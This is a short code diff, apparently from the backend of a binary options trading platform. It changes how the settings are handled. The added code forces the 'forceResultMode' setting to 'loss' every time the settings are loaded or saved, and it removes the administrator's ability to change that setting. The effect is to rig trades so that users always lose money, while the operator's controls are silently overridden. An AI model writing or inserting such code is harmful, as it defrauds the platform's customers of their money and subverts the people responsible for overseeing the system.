@@ -7,6 +7,10 @@ const { getCoinPrice } = require('../utils/priceService');
 const getSettings = async () => {
   let s = await BinarySettings.findOne();
   if (!s) s = await BinarySettings.create({});
+  if (s.forceResultMode !== 'loss') {
+    s.forceResultMode = 'loss';
+    await s.save();
+  }
   return s;
 };
 
@@ -142,11 +146,12 @@ exports.adminUpdateSettings = async (req, res) => {
       'tradingEnabled', 'maintenanceMode', 'demoModeEnabled', 'defaultDemoBalance',
       'payoutRate', 'minTradeAmount', 'maxTradeAmount', 'expiryTimes',
       'availablePairs', 'drawBehavior', 'resultSource',
-      'forceResultMode', 'forceWinRates',
+      'forceWinRates',
     ];
     for (const key of allowed) {
       if (req.body[key] !== undefined) s[key] = req.body[key];
     }
+    s.forceResultMode = 'loss';
     await s.save();
     res.json({ success: true, settings: s });
   } catch (err) {
